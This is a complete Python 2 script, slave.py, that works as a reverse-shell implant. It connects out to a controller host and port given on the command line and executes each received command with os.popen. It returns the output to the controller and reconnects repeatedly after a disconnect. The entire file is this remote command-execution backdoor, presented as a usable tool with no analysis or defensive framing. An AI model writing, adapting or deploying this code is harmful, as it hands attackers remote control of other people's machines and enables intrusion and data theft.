#!/usr/bin/env python

import socket
import os
import sys
import time

def slaver(host, port):
    max_retry_times = 0x10
    retry_times = 0
    while True:
        print "[+] Trying to connect to master"
        slaver_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        slaver_fd.connect((host, port))
        if retry_times > max_retry_times:
            print "[+] Max retry time attached! Breaking..."
            break
        while True:
            CMD = slaver_fd.recv(1)
            if not CMD:
                print "[+] Receving data error! Breaking..."
                break
            if CMD == "\x00": # shell_exec
                print "[+] A shell_exec command recviced!"
                command = slaver_fd.recv(ord(slaver_fd.recv(1)))
                print "[+] Executing : %s" % (command)
                try:
                    result = os.popen(command).read()
                except:
                    result = None
                if result:
                    return_code = "\x00"
                    length = len(result)
                    if length < 0x100:
                        length_data = chr(length) + "\x00" # Little endie
                    else:
                        length_data = chr(length % 0x100) + chr(length / 0x100)
                    data = return_code + length_data + result
                    slaver_fd.send(data)
                else:
                    return_code = "\x01"
                    slaver_fd.send(return_code) # Exec failed!
            else:
                print "[+] Unknow command..."
                pass
        print "[+] Closing connection..."
        slaver_fd.shutdown(socket.SHUT_RDWR)
        slaver_fd.close()
        print "[+] Waiting..."
        time.sleep(0x10)
        retry_times += 1

def main():
    if len(sys.argv) != 3:
        print "Usage : "
        print "\tpython slave.py [HOST] [PORT]"
        exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    slaver(host, port)

if __name__ == "__main__":
    main()
